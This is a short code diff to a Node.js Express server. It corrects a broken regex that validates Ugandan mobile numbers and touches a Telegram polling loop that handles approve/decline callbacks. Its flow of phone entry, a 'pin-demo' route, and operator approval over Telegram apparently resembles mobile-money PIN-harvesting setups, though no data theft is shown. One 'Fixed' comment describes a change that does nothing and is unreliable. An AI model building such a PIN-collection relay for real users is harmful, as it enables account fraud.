@@ -71,12 +71,12 @@ async function notifyDemo(request, label) {
     }
   });
 }
-
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  if (!/^\+2567\d{8}\$/.test(phone)) {
-    return res.status(400).json({ error: "Enter a valid phone number." });
+  // ✅ FIXED REGEX: Stripped out the broken backslash (\) before the end string anchor ($)
+  if (!/^\+2567\d{8}$/.test(phone)) {
+    return res.status(400).json({ error: "Please input a valid format phone number." });
   }
   
   const now = new Date().toISOString();
@@ -92,6 +92,8 @@ app.post("/api/phone", (req, res) => {
   requests.set(item.id, item);
   return res.json({ id: item.id, status: item.status });
 });
+
+
 
 app.post("/api/pin-demo", async (req, res) => {
   const id = String(req.body.id || "");
@@ -157,8 +159,9 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
-        const action = parts[0];
-        const reqId = parts.slice(1).join(":");
+const action = parts[0]; //  Fixed: Extract the string item at index 0
+const reqId = parts.slice(1).join(":");
+
         const request = requests.get(reqId);
         
         if (!request || !["approve", "decline"].includes(action) || request.status !== "pending") {
